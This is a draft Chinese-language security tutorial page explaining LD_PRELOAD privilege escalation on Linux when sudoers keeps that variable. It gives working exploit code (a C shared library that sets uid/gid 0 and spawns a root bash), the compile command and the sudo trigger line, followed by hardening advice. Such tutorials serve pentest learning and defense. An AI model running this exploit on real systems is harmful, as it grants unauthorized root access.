---
title: "SRC Privilege Escalation"
categories:
  - 技术
  - 教程
tags: [SRC, Privilege Escalation]
draft: true
sidebar: false
outline: 2
---

# SRC Privilege Escalation 

🐧 [Linux Privilege Escalation](../security/privilegeEscalation.md)

🪟 [Windows Privilege Escalation](../windows/WinPrivilegeEscalation.md)

## LD_PRELOAD

这是一个非常经典且高效的 Linux 提权手段！在渗透测试或 CTF 比赛中，如果你发现 `sudo -l` 的输出中包含 `env_keep += LD_PRELOAD`，那么恭喜你，这基本上等同于拿到了 root 权限。

下面我为你详细拆解这个漏洞的原理、利用步骤以及加固方案。

---

### 🛡️ 原理剖析

**1. 什么是 LD_PRELOAD？**
`LD_PRELOAD` 是 Linux 环境变量，它允许你定义在程序执行时优先加载的动态链接库（.so 文件）。这通常用于调试或覆盖标准库函数。

**2. 为什么会有提权风险？**
在默认情况下，出于安全考虑，`sudo` 在执行命令时会重置环境变量。但如果 `/etc/sudoers` 配置文件中设置了 `Defaults env_keep += "LD_PRELOAD"`，这就意味着 `sudo` 会保留这个环境变量，并将它传递给以 root 权限运行的进程。



---

### 🚀 提权实战步骤

只要你拥有某个命令的 `sudo` 执行权限（即使是一个无关紧要的命令，比如 `find` 或 `ls`），就可以按照以下步骤操作：

#### 第一步：编写恶意 C 源码
我们需要编写一个简单的动态库 `exploit.c`，利用 `_init` 函数。这个函数会在库被加载时立即执行。

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    // 关键：重置 UID/GID 为 0 (root)
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    // 弹出 shell
    system("/bin/bash");
}
```

#### 第二步：编译为共享库 (.so)
使用 `gcc` 将源码编译成动态链接库：

```bash
gcc -fPIC -shared -o /tmp/pe.so exploit.c -nostartfiles
```
* `-fPIC`: 生成位置无关代码。
* `-shared`: 生成共享库。
* `-nostartfiles`: 不包含标准启动文件（防止重复定义）。

#### 第三步：触发提权
运行任何你可以使用 `sudo` 执行的命令，并带上 `LD_PRELOAD` 指向你的恶意库：

```bash
sudo LD_PRELOAD=/tmp/pe.so <你拥有权限的命令>
# 例如：sudo LD_PRELOAD=/tmp/pe.so ls
```

执行后，你将直接获得一个 **root shell**。

---

### 🛑 如何防御？

在生产环境中，这种配置是非常危险的。加固建议如下：

1.  **移除 env_keep**: 检查 `/etc/sudoers`，确保没有 `env_keep += "LD_PRELOAD"`。
2.  **强制安全路径**: 启用 `Defaults secure_path`，这会限制 `sudo` 运行时的环境变量路径。
3.  **最小权限原则**: 仅给用户必要的 sudo 权限，并尽量避免保留用户自定义的环境变量。

---
